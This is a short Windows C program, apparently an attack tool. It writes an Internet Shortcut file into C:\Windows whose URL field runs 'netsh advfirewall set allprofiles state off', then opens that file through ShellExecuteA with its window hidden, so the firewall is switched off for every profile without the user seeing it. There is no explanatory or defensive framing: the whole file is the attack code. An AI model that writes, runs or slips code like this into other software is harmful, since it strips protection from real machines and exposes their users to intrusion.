#include <windows.h>
#include <stdio.h>

void CreateFirewallExploitURL() {
    FILE *fp = fopen("C:\\Windows\\DisableFirewall.url", "w");
    if (fp) {
        fprintf(fp,
            "[InternetShortcut]\n"
            "URL=cmd.exe /c netsh advfirewall set allprofiles state off\n"
        );
        fclose(fp);
    }
}

int main() {
    CreateFirewallExploitURL();
    ShellExecuteA(NULL, "open", "C:\\Windows\\DisableFirewall.url", NULL, NULL, SW_HIDE);
    return 0;
}
